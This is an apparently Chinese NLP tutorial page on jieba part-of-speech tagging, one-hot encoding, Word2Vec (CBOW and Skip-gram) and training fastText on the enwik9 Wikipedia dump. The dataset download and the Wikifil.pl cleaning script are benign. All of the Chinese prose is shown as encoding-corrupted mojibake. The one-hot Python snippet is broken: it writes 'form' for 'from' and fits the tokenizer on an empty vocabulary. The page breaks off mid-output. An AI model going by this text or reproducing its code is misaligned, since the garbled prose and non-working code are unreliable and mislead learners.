jieba.posseg <span class="hljs-keyword">as</span> posseg<br><span class="hljs-built_in">print</span>(posseg.lcut(<span class="hljs-string">&#x27;æˆ‘æ˜¯å°æ˜ï¼Œæˆ‘çˆ±ä¸Šæµ·äº¤é€šå¤§å­¦&#x27;</span>))<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-name">pair</span>(<span class="hljs-symbol">&#x27;æˆ‘</span>&#x27;, <span class="hljs-symbol">&#x27;r</span>&#x27;), pair(<span class="hljs-symbol">&#x27;æ˜¯</span>&#x27;, <span class="hljs-symbol">&#x27;v</span>&#x27;), pair(<span class="hljs-symbol">&#x27;å°æ˜</span>&#x27;, <span class="hljs-symbol">&#x27;nr</span>&#x27;), pair(<span class="hljs-symbol">&#x27;ï¼Œ</span>&#x27;, <span class="hljs-symbol">&#x27;x</span>&#x27;), pair(<span class="hljs-symbol">&#x27;æˆ‘</span>&#x27;, <span class="hljs-symbol">&#x27;r</span>&#x27;), pair(<span class="hljs-symbol">&#x27;çˆ±</span>&#x27;, <span class="hljs-symbol">&#x27;v</span>&#x27;), pair(<span class="hljs-symbol">&#x27;ä¸Šæµ·äº¤é€šå¤§å­¦</span>&#x27;, <span class="hljs-symbol">&#x27;nt</span>&#x27;)]<br></code></pre></td></tr></table></figure><table><thead><tr><th>æ ‡ç­¾</th><th>å«ä¹‰</th><th>æ ‡ç­¾</th><th>å«ä¹‰</th><th>æ ‡ç­¾</th><th>å«ä¹‰</th><th>æ ‡ç­¾</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>n</td><td>æ™®é€šåè¯</td><td>f</td><td>æ–¹ä½åè¯</td><td>s</td><td>å¤„æ‰€åè¯</td><td>t</td><td>æ—¶é—´</td></tr><tr><td>nr</td><td>äººå</td><td>ns</td><td>åœ°å</td><td>nt</td><td>æœºæ„å</td><td>nw</td><td>ä½œå“å</td></tr><tr><td>nz</td><td>å…¶ä»–ä¸“å</td><td>v</td><td>æ™®é€šåŠ¨è¯</td><td>vd</td><td>åŠ¨å‰¯è¯</td><td>vn</td><td>ååŠ¨è¯</td></tr><tr><td>a</td><td>å½¢å®¹è¯</td><td>ad</td><td>å‰¯å½¢è¯</td><td>an</td><td>åå½¢è¯</td><td>d</td><td>å‰¯è¯</td></tr><tr><td>m</td><td>æ•°é‡è¯</td><td>q</td><td>é‡è¯</td><td>r</td><td>ä»£è¯</td><td>p</td><td>ä»‹è¯</td></tr><tr><td>c</td><td>è¿è¯</td><td>u</td><td>åŠ©è¯</td><td>xc</td><td>å…¶ä»–è™šè¯</td><td>w</td><td>æ ‡ç‚¹ç¬¦å·</td></tr><tr><td>PER</td><td>äººå</td><td>LOC</td><td>åœ°å</td><td>ORG</td><td>æœºæ„å</td><td>TIME</td><td>æ—¶é—´</td></tr></tbody></table><h1 id="2-æ–‡æœ¬å¼ é‡è¡¨ç¤ºæ–¹æ³•"><a href="#2-æ–‡æœ¬å¼ é‡è¡¨ç¤ºæ–¹æ³•" class="headerlink" title="2.æ–‡æœ¬å¼ é‡è¡¨ç¤ºæ–¹æ³•"></a>2.æ–‡æœ¬å¼ é‡è¡¨ç¤ºæ–¹æ³•</h1><p>æ–‡æœ¬å¼ é‡è¡¨ç¤ºï¼šè®²ä¸€æ®µæ–‡æœ¬ä½¿ç”¨å¼ é‡è¿›è¡Œè¡¨ç¤ºï¼Œå…¶ä¸­ä¸€èˆ¬è¯æ±‡è¡¨ç¤ºæˆå‘é‡ï¼Œç§°ä¸ºè¯å‘é‡ï¼Œå†ç”±å„ä¸ªè¯å‘é‡æŒ‰é¡ºåºç»„æˆçŸ©é˜µå½¢æˆæ–‡æœ¬è¡¨ç¤ºã€‚</p><p>ä¾‹å­ï¼š[â€œå­¦å†â€,â€æ˜¯â€,â€æˆ‘â€,â€ä¸‹ä¸æ¥çš„â€,â€é«˜å°â€]<br>&#x3D;&#x3D;&gt;    [[1.32, 4.11, 2.33],<br>        [5.32, 6.11, 2.53],<br>        [1.22, 4.16, 2.83],<br>        [8.32, 6.61, 2.83],<br>        [8.62, 4.71, 2.73]]</p><h2 id="æ–‡æœ¬å¼ é‡è¡¨ç¤ºçš„æ–¹æ³•"><a href="#æ–‡æœ¬å¼ é‡è¡¨ç¤ºçš„æ–¹æ³•" class="headerlink" title="æ–‡æœ¬å¼ é‡è¡¨ç¤ºçš„æ–¹æ³•"></a>æ–‡æœ¬å¼ é‡è¡¨ç¤ºçš„æ–¹æ³•</h2><ul><li>one-hotç¼–ç </li></ul><p>One-hotç¼–ç æ˜¯å°†æ¯ä¸ªè¯æˆ–å­—ç¬¦æ˜ å°„åˆ°ä¸€ä¸ªå”¯ä¸€çš„æ•´æ•°ç´¢å¼•ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå‘é‡ï¼Œé•¿åº¦ä¸è¯æ±‡è¡¨å¤§å°ç›¸åŒï¼Œæ‰€æœ‰å…ƒç´ ä¸º0ï¼Œé™¤äº†å¯¹åº”ç´¢å¼•å¤„çš„å…ƒç´ ä¸º1ã€‚ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè¯æ±‡è¡¨åŒ…å«4ä¸ªè¯ï¼š[â€œappleâ€, â€œbananaâ€, â€œorangeâ€, â€œgrapeâ€]ï¼Œåˆ™æ¯ä¸ªè¯å¯ä»¥è¢«ç¼–ç ä¸ºï¼š</p><p>apple: [1, 0, 0, 0]<br>banana: [0, 1, 0, 0]<br>orange: [0, 0, 1, 0]<br>grape: [0, 0, 0, 1]<br>One-hotç¼–ç çš„ä¼˜ç‚¹æ˜¯ç®€å•ç›´è§‚ï¼Œå¹¶ä¸”ä¸ä¼šå¼•å…¥ä»»ä½•è¯­ä¹‰ç›¸å…³æ€§ã€‚ç„¶è€Œï¼Œå®ƒä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼Œæ¯”å¦‚ç¼–ç çš„å‘é‡ç»´åº¦å¾ˆå¤§ï¼Œä¸”æ— æ³•æ•æ‰è¯æ±‡ä¹‹é—´çš„è¯­ä¹‰ç›¸ä¼¼æ€§ã€‚</p><ul><li><p>one-hotç¼–ç å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">form sklearn.externals <span class="hljs-keyword">import</span> joblib<br>form keras.preprocessing.text <span class="hljs-keyword">import</span> Tokenizer<br>vocab = &#123;&#125;<br>t = Tokenizer(num_words = <span class="hljs-literal">None</span>, char_level=<span class="hljs-literal">False</span>)<br>t.fit_on_texts(vocab)<br><br><span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> vocab:<br>    zero_list = [<span class="hljs-number">0</span>]*<span class="hljs-built_in">len</span>(vocab)<br>    token_index = t.texts_to_sequences([token])[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span><br>    zero_list[token_index] = <span class="hljs-number">1</span><br><span class="hljs-comment"># ä¿å­˜</span><br>tokenizer_path = <span class="hljs-string">&quot;./Tokenizer&quot;</span><br>joblib.dump(t, tokenizer_path)<br></code></pre></td></tr></table></figure></li><li><p>one-hotç¼–ç ä½¿ç”¨</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨</span><br>t = joblib.load(tokenizer_path)<br>token = <span class="hljs-string">&quot;è¯&quot;</span><br>token_index = t.texts_to_sequences([token])[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">1</span><br>zero_list = [<span class="hljs-number">0</span>]*<span class="hljs-built_in">len</span>(vocab)<br>zero_list[token_index] = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>Word2vec</li></ul><p>Word2Vecæ˜¯ä¸€ç§è¯åµŒå…¥æŠ€æœ¯ï¼Œå®ƒèƒ½å¤Ÿå°†è¯æ±‡æ˜ å°„åˆ°ä¸€ä¸ªè¿ç»­çš„ä½ç»´å‘é‡ç©ºé—´ã€‚</p><p>Word2Vecæ¨¡å‹é€šè¿‡å­¦ä¹ å¤§é‡æ–‡æœ¬è¯­æ–™åº“ä¸­çš„ä¸Šä¸‹æ–‡ä¿¡æ¯æ¥äº§ç”Ÿè¿™äº›å‘é‡ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šåœ¨ä¸€ä¸ªçª—å£å†…ï¼Œä¸€ä¸ªè¯çš„ä¸Šä¸‹æ–‡å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç†è§£è¿™ä¸ªè¯çš„å«ä¹‰ã€‚</p><p>Word2Vecç”Ÿæˆçš„è¯å‘é‡å…·æœ‰ä¸€å®šçš„è¯­ä¹‰å…³ç³»ï¼Œå³åœ¨å‘é‡ç©ºé—´ä¸­ç›¸ä¼¼çš„è¯åœ¨è¯­ä¹‰ä¸Šä¹Ÿæ˜¯ç›¸ä¼¼çš„ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡Word2Vecè®­ç»ƒå¾—åˆ°çš„è¯å‘é‡ï¼Œå¯ä»¥é€šè¿‡è®¡ç®—å‘é‡ä¹‹é—´çš„è·ç¦»æ¥æ‰¾å‡ºè¯­ä¹‰ä¸Šç›¸ä¼¼çš„è¯ã€‚</p><p>Word2Vecæ¨¡å‹æœ‰ä¸¤ç§ä¸»è¦çš„æ¶æ„ï¼šè¿ç»­è¯è¢‹ï¼ˆCBOWï¼‰å’ŒSkip-gramã€‚</p><ul><li>CBOWï¼ˆContinuous Bag of Wordsï¼‰ï¼šé€šè¿‡ä¸Šä¸‹æ–‡è¯é¢„æµ‹ç›®æ ‡è¯ã€‚</li></ul><p>CBOWåœ¨ç»™å®šçš„ä¸€æ®µæ–‡æœ¬è¯­æ–™ä¸­é€‰è°ƒæŸæ®µé•¿åº¦ <p style="color: #FF0000;">ï¼ˆçª—å£ï¼‰</p> ä½œä¸ºç ”ç©¶å¯¹è±¡ï¼Œä½¿ç”¨ä¸Šä¸‹æ–‡è¯æ±‡è¿›è¡Œé¢„æµ‹.</p><p><img src="/Pictures/DL/03/plot01.jpg" alt="img"></p><p>åˆ†æï¼šå›¾ä¸­çª—å£å¤§å°ä¸º9ï¼Œä½¿ç”¨å‰å4ä¸ªè¯æ±‡é¢„æµ‹ä¸­å¿ƒè¯ã€‚</p><p>CBOWæ¨¡å‹çš„å·¥ä½œåŸç†ï¼š</p><ol><li><p>è¾“å…¥å±‚ï¼šCBOWæ¨¡å‹çš„è¾“å…¥å±‚æ¥æ”¶ç”±ä¸Šä¸‹æ–‡è¯æ±‡è¡¨ç¤ºçš„One-hotç¼–ç ã€‚å‡è®¾æˆ‘ä»¬ä½¿ç”¨çª—å£å¤§å°ä¸º2çš„ä¸Šä¸‹æ–‡ï¼Œå¯¹äºç»™å®šçš„ç›®æ ‡è¯æ±‡ï¼Œä¸Šä¸‹æ–‡è¯æ±‡åŒ…æ‹¬å…¶å·¦å³ä¸¤ä¸ªè¯æ±‡ã€‚</p></li><li><p>æŠ•å½±å±‚ï¼šè¾“å…¥çš„One-hotç¼–ç ç»è¿‡ä¸€ä¸ªæŠ•å½±å±‚ï¼Œå°†æ¯ä¸ªOne-hotç¼–ç æ˜ å°„åˆ°ä¸€ä¸ªè¿ç»­çš„ä½ç»´å‘é‡ç©ºé—´ï¼Œå³è¯å‘é‡ç©ºé—´ã€‚</p></li><li><p>åˆå¹¶å±‚ï¼šåˆå¹¶å±‚å°†æ‰€æœ‰ä¸Šä¸‹æ–‡è¯æ±‡çš„è¯å‘é‡è¿›è¡Œå¹³å‡æˆ–æ±‚å’Œï¼Œå¾—åˆ°ä¸€ä¸ªè¡¨ç¤ºä¸Šä¸‹æ–‡ä¿¡æ¯çš„å‘é‡ã€‚</p></li><li><p>è¾“å‡ºå±‚ï¼šåˆå¹¶åçš„ä¸Šä¸‹æ–‡å‘é‡é€šè¿‡è¾“å‡ºå±‚è¿›è¡Œé¢„æµ‹ï¼Œè¾“å‡ºå±‚æ˜¯ä¸€ä¸ªsoftmaxåˆ†ç±»å™¨ï¼Œç”¨äºé¢„æµ‹è¯æ±‡è¡¨ä¸­æ¯ä¸ªè¯æ±‡çš„æ¦‚ç‡åˆ†å¸ƒã€‚æœ€ç»ˆï¼Œæ¨¡å‹é€‰æ‹©æ¦‚ç‡æœ€é«˜çš„è¯æ±‡ä½œä¸ºé¢„æµ‹çš„ç›®æ ‡è¯æ±‡</p></li></ol><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç®€å•çš„è¯­æ–™åº“ï¼šâ€The cat sat on the mat.â€</p><ol><li><p>è¾“å…¥ï¼šâ€œTheâ€ã€â€œsatâ€ã€â€œtheâ€ã€â€œonâ€ çš„One-hotç¼–ç ã€‚</p></li><li><p>æŠ•å½±å±‚ï¼šå°†ä¸Šè¿°è¯æ±‡çš„One-hotç¼–ç æ˜ å°„åˆ°è¯å‘é‡ç©ºé—´ã€‚å‡è®¾æˆ‘ä»¬çš„è¯å‘é‡ç»´åº¦ä¸º3ï¼Œæ¯ä¸ªè¯æ±‡çš„å‘é‡è¡¨ç¤ºå¦‚ä¸‹ï¼š</p></li></ol><p>â€œTheâ€ï¼š[0.2, 0.3, 0.1]<br>â€œsatâ€ï¼š[-0.1, 0.2, 0.4]<br>â€œtheâ€ï¼š[0.3, -0.1, 0.2]<br>â€œonâ€ï¼š[0.4, 0.1, -0.3]</p><ol start="3"><li><p>åˆå¹¶å±‚ï¼šå°†æ‰€æœ‰ä¸Šä¸‹æ–‡è¯æ±‡çš„è¯å‘é‡è¿›è¡Œå¹³å‡æˆ–æ±‚å’Œã€‚å‡è®¾æˆ‘ä»¬å°†å®ƒä»¬æ±‚å’Œï¼Œå¾—åˆ°åˆå¹¶åçš„ä¸Šä¸‹æ–‡å‘é‡ä¸ºï¼š[0.8, 0.5, 0.4]ã€‚</p></li><li><p>è¾“å‡ºå±‚ï¼šåˆ©ç”¨åˆå¹¶åçš„ä¸Šä¸‹æ–‡å‘é‡ï¼Œé€šè¿‡softmaxåˆ†ç±»å™¨é¢„æµ‹ç›®æ ‡è¯æ±‡çš„æ¦‚ç‡åˆ†å¸ƒã€‚ä¾‹å¦‚ï¼Œé¢„æµ‹ â€œcatâ€ çš„æ¦‚ç‡ä¸º0.6ï¼Œâ€dogâ€ çš„æ¦‚ç‡ä¸º0.3ï¼Œâ€appleâ€ çš„æ¦‚ç‡ä¸º0.1ã€‚åˆ™æ¨¡å‹å°†é€‰æ‹©æ¦‚ç‡æœ€é«˜çš„è¯æ±‡ â€œcatâ€ ä½œä¸ºé¢„æµ‹çš„ç›®æ ‡è¯æ±‡ã€‚</p></li></ol><ul><li>Skip-gramï¼šé€šè¿‡ç›®æ ‡è¯é¢„æµ‹ä¸Šä¸‹æ–‡è¯ã€‚<br>Skip-gramæ¨¡å‹æ˜¯Word2Vecä¸­çš„ä¸€ç§æ¨¡å‹ï¼Œä¸CBOWæ¨¡å‹ç›¸åï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯æ ¹æ®ç›®æ ‡è¯æ¥é¢„æµ‹ä¸Šä¸‹æ–‡è¯ï¼Œé€šè¿‡å­¦ä¹ åˆ°çš„è¯å‘é‡æ¥æ•æ‰è¯æ±‡ä¹‹é—´çš„è¯­ä¹‰å…³ç³»ã€‚</li></ul><p>ç»“æ„æ¨¡å‹ï¼š</p><ol><li><p>è¾“å…¥å±‚ï¼šSkip-gramæ¨¡å‹çš„è¾“å…¥æ˜¯ç›®æ ‡è¯çš„One-hotç¼–ç ã€‚</p></li><li><p>æŠ•å½±å±‚ï¼šè¾“å…¥çš„One-hotç¼–ç ç»è¿‡ä¸€ä¸ªæŠ•å½±å±‚ï¼Œå°†æ¯ä¸ªOne-hotç¼–ç æ˜ å°„åˆ°ä¸€ä¸ªè¿ç»­çš„ä½ç»´å‘é‡ç©ºé—´ï¼Œå³è¯å‘é‡ç©ºé—´ã€‚</p></li><li><p>è¾“å‡ºå±‚ï¼šæŠ•å½±åçš„ç›®æ ‡è¯æ±‡å‘é‡é€šè¿‡è¾“å‡ºå±‚ï¼Œè¾“å‡ºçš„æ˜¯ä¸Šä¸‹æ–‡è¯æ±‡çš„æ¦‚ç‡åˆ†å¸ƒã€‚å¯¹äºç»™å®šçš„ç›®æ ‡è¯æ±‡ï¼ŒSkip-gramæ¨¡å‹è¯•å›¾å­¦ä¹ åˆ°ä¸€ä¸ªæ¦‚ç‡åˆ†å¸ƒï¼Œä½¿å¾—ç»™å®šç›®æ ‡è¯æ±‡çš„æƒ…å†µä¸‹ï¼Œå…¶å‘¨å›´ä¸Šä¸‹æ–‡è¯æ±‡å‡ºç°çš„æ¦‚ç‡æœ€å¤§åŒ–ã€‚è¾“å‡ºå±‚æ˜¯ä¸€ä¸ªsoftmaxåˆ†ç±»å™¨ï¼Œç”¨äºé¢„æµ‹è¯æ±‡è¡¨ä¸­æ¯ä¸ªè¯æ±‡çš„æ¦‚ç‡åˆ†å¸ƒã€‚</p></li></ol><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç®€å•çš„è¯­æ–™åº“ï¼šâ€The cat sat on the mat.â€</p><ol><li><p>è¾“å…¥ï¼šâ€œcatâ€ çš„One-hotç¼–ç ã€‚</p></li><li><p>æŠ•å½±å±‚ï¼šå°†ç›®æ ‡è¯æ±‡çš„One-hotç¼–ç æ˜ å°„åˆ°è¯å‘é‡ç©ºé—´ã€‚å‡è®¾æˆ‘ä»¬çš„è¯å‘é‡ç»´åº¦ä¸º3ï¼Œæ¯ä¸ªè¯æ±‡çš„å‘é‡è¡¨ç¤ºå¦‚ä¸‹ï¼š</p></li></ol><p>â€œcatâ€ï¼š[0.2, 0.5, -0.1]</p><ol start="3"><li>è¾“å‡ºå±‚ï¼šåˆ©ç”¨æŠ•å½±åçš„ç›®æ ‡è¯æ±‡å‘é‡ï¼Œé€šè¿‡softmaxåˆ†ç±»å™¨é¢„æµ‹å‘¨å›´ä¸Šä¸‹æ–‡è¯æ±‡çš„æ¦‚ç‡åˆ†å¸ƒã€‚ä¾‹å¦‚ï¼Œé¢„æµ‹ â€œTheâ€ çš„æ¦‚ç‡ä¸º0.6ï¼Œâ€satâ€ çš„æ¦‚ç‡ä¸º0.3ï¼Œâ€matâ€ çš„æ¦‚ç‡ä¸º0.1ã€‚åˆ™æ¨¡å‹å°†é€‰æ‹©æ¦‚ç‡æœ€é«˜çš„è¯æ±‡ä½œä¸ºä¸Šä¸‹æ–‡è¯æ±‡çš„é¢„æµ‹ç»“æœã€‚</li></ol><ul><li>Word Embedding<br>Word Embeddingæ˜¯ä¸€ç§å°†è¯æ±‡æ˜ å°„åˆ°å®æ•°å‘é‡çš„æŠ€æœ¯.</li></ul><p>å¹¿ä¹‰çš„word embeddingåŒ…æ‹¬æ‰€æœ‰å¯†é›†è¯æ±‡å‘é‡çš„è¡¨ç¤ºæ–¹æ³•ï¼Œç‹­ä¹‰çš„word embeddingæŒ‡åœ¨ç¥ç»ç½‘ç»œä¸­åŠ å…¥embeddingå±‚ï¼Œå¯¹æ•´ä¸ªç½‘ç»œè¿›è¡Œè®­ç»ƒçš„åŒæ—¶äº§ç”Ÿçš„embeddingçŸ©é˜µã€‚</p><h2 id="ä½¿ç”¨fasttextå·¥å…·å®ç°word2vecçš„è®­ç»ƒå’Œä½¿ç”¨"><a href="#ä½¿ç”¨fasttextå·¥å…·å®ç°word2vecçš„è®­ç»ƒå’Œä½¿ç”¨" class="headerlink" title="ä½¿ç”¨fasttextå·¥å…·å®ç°word2vecçš„è®­ç»ƒå’Œä½¿ç”¨"></a>ä½¿ç”¨fasttextå·¥å…·å®ç°word2vecçš„è®­ç»ƒå’Œä½¿ç”¨</h2><ol><li>è·å–è®­ç»ƒæ•°æ®</li><li>è®­ç»ƒè¯å‘é‡</li><li>æ¨¡å‹è¶…å‚æ•°è®¾å®š</li><li>æ¨¡å‹æ•ˆæœæ£€éªŒ</li><li>æ¨¡å‹çš„ä¿å­˜ä¸é‡åŠ è½½</li></ol><h3 id="è·å–è®­ç»ƒæ•°æ®"><a href="#è·å–è®­ç»ƒæ•°æ®" class="headerlink" title="è·å–è®­ç»ƒæ•°æ®"></a>è·å–è®­ç»ƒæ•°æ®</h3><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ç ”ç©¶ <em>Wikipedia</em> çš„éƒ¨åˆ†ç½‘é¡µä¿¡æ¯ã€‚<br>ä¸‹è½½æ•°æ®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> mkdir <span class="hljs-keyword">data</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">wget</span> <span class="hljs-literal">-c</span> http://mattmahoney.net/dc/enwik9.zip <span class="hljs-literal">-P</span> <span class="hljs-keyword">data</span><br><span class="hljs-variable">$</span> unzip <span class="hljs-keyword">data</span>/enwik9.zip <span class="hljs-literal">-d</span> <span class="hljs-keyword">data</span><br></code></pre></td></tr></table></figure><p>åŸå§‹æ•°æ®å¤„ç†ï¼šæˆ‘ä»¬éœ€è¦å°†htmlè¯­è¨€ä¸­æ— ç”¨çš„ç¬¦å·å»é™¤ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨fasttextä¸­çš„Perlè„šæœ¬Wikifil.pl</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><br><span class="hljs-comment"># Program to filter Wikipedia XML dumps to &quot;clean&quot; text consisting only of lowercase</span><br><span class="hljs-comment"># letters (a-z, converted from A-Z), and spaces (never consecutive).  </span><br><span class="hljs-comment"># All other characters are converted to spaces.  Only text which normally appears </span><br><span class="hljs-comment"># in the web browser is displayed.  Tables are removed.  Image captions are </span><br><span class="hljs-comment"># preserved.  Links are converted to normal text.  Digits are spelled out.</span><br><br><span class="hljs-comment"># Written by Matt Mahoney, June 10, 2006.  This program is released to the public domain.</span><br><br>$/=<span class="hljs-string">&quot;&gt;&quot;</span>;                     <span class="hljs-comment"># input record separator</span><br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/&lt;text /</span>) &#123;$text=<span class="hljs-number">1</span>;&#125;  <span class="hljs-comment"># remove all but between &lt;text&gt; ... &lt;/text&gt;</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/#redirect/i</span>) &#123;$text=<span class="hljs-number">0</span>;&#125;  <span class="hljs-comment"># remove #REDIRECT</span><br>  <span class="hljs-keyword">if</span> ($text) &#123;<br><br>    <span class="hljs-comment"># Remove any text not normally visible</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/&lt;\/text&gt;/</span>) &#123;$text=<span class="hljs-number">0</span>;&#125;<br>    s/&lt;.*&gt;<span class="hljs-regexp">//</span>;               <span class="hljs-comment"># remove xml tags</span><br>    s/&amp;amp;<span class="hljs-regexp">/&amp;/g</span>;            <span class="hljs-comment"># decode URL encoded chars</span><br>    s/&amp;<span class="hljs-keyword">lt</span>;<span class="hljs-regexp">/&lt;/g</span>;<br>    <span class="hljs-regexp">s/&amp;gt;/&gt;/g</span>;<br>    <span class="hljs-regexp">s/&lt;ref[^&lt;]*&lt;\/ref&gt;//g</span>;  <span class="hljs-comment"># remove references &lt;ref...&gt; ... &lt;/ref&gt;</span><br>    s/&lt;[^&gt;]*&gt;<span class="hljs-regexp">//g</span>;           <span class="hljs-comment"># remove xhtml tags</span><br>    s/\[http:[^] ]*<span class="hljs-regexp">/[/g</span>;    <span class="hljs-comment"># remove normal url, preserve visible text</span><br>    s/\|thumb//ig;          <span class="hljs-comment"># remove images links, preserve caption</span><br>    s/\|left//ig;<br>    <span class="hljs-regexp">s/\|right//ig</span>;<br>    <span class="hljs-regexp">s/\|\d+px//ig</span>;<br>    <span class="hljs-regexp">s/\[\[image:[^\[\]]*\|//ig</span>;<br>    <span class="hljs-regexp">s/\[\[category:([^|\]]*)[^]]*\]\]/[[$1]]/ig</span>;  <span class="hljs-comment"># show categories without markup</span><br>    s/\[\[[a-z\-]*:[^\]]*\]\]//g;  <span class="hljs-comment"># remove links to other languages</span><br>    s/\[\[[^\|\]]*\|<span class="hljs-regexp">/[[/g</span>;  <span class="hljs-comment"># remove wiki url, preserve visible text</span><br>    s/\&#123;\&#123;[^\&#125;]*\&#125;\&#125;//g;         <span class="hljs-comment"># remove &#123;&#123;icons&#125;&#125; and &#123;tables&#125;</span><br>    s/\&#123;[^\&#125;]*\&#125;//g;<br>    <span class="hljs-regexp">s/\[//g</span>;                <span class="hljs-comment"># remove [ and ]</span><br>    s/\]//g;<br>    <span class="hljs-regexp">s/&amp;[^;]*;/ /g</span>;          <span class="hljs-comment"># remove URL encoded chars</span><br><br>    <span class="hljs-comment"># convert to lowercase letters and spaces, spell digits</span><br>    $_=<span class="hljs-string">&quot; $_ &quot;</span>;<br>    <span class="hljs-regexp">tr/A-Z/a-z/</span>;<br>    <span class="hljs-regexp">s/0/ zero /g</span>;<br>    <span class="hljs-regexp">s/1/ one /g</span>;<br>    <span class="hljs-regexp">s/2/ two /g</span>;<br>    <span class="hljs-regexp">s/3/ three /g</span>;<br>    <span class="hljs-regexp">s/4/ four /g</span>;<br>    <span class="hljs-regexp">s/5/ five /g</span>;<br>    <span class="hljs-regexp">s/6/ six /g</span>;<br>    <span class="hljs-regexp">s/7/ seven /g</span>;<br>    <span class="hljs-regexp">s/8/ eight /g</span>;<br>    <span class="hljs-regexp">s/9/ nine /g</span>;<br>    <span class="hljs-regexp">tr/a-z/ /</span>cs;<br>    <span class="hljs-keyword">chop</span>;<br>    <span class="hljs-keyword">print</span> $_;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è®­ç»ƒè¯å‘é‡"><a href="#è®­ç»ƒè¯å‘é‡" class="headerlink" title="è®­ç»ƒè¯å‘é‡"></a>è®­ç»ƒè¯å‘é‡</h3><p>ä»£ç ç›´æ¥åœ¨è§£é‡Šå™¨ä¸­è¿è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> fasttext<br><span class="hljs-meta">&gt;&gt;&gt; </span>model = fasttext.train_unsupervised(<span class="hljs-string">&#x27;data/fil9&#x27;</span>)<br>Read 124M words<br>Number of words:  <span class="hljs-number">218316</span><br>Number of labels: <span class="hljs-number">0</span><br>Progress: <span class="hljs-number">100.0</span>% words/sec/thread:   <span class="hljs-number">48200</span> lr:  <span class="hljs-number">0.000000</span> avg.loss:  <span class="hljs-number">0.746600</span> ETA:   0h 0m 0s<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>model.get_word_vector(<span class="hljs-string">&quot;the&quot;</span>)<br>array([ <span class="hljs-number">0.21138486</span>, -<span class="hljs-number">0.12589064</span>, -<span class="hljs-number">0.19342858</span>, -<span class="hljs-number">0.19221118</span>, -<span class="hljs-number">0.01785146</span>,<br>        <span class="hljs-number">0.01988586</span>, -<span 